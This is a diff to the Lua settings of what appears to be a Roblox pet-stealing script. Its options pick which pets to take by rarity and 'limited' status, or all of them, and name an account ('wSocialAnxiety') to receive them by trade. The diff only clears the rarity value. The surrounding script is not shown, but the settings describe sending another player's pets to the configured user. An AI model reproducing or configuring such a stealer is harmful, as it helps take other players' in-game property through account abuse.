@@ -1,4 +1,4 @@
-PetRarity = "Legendary" -- Select Pet Rarity: Common Epic Legendary
+PetRarity = "" -- Select Pet Rarity: Common Epic Legendary
 PetLimited = true -- If pet is limited it will take it!
 PetAll = false -- Will send all hes pets
 TradeUser = "wSocialAnxiety" -- Write your username so it will send to you trade
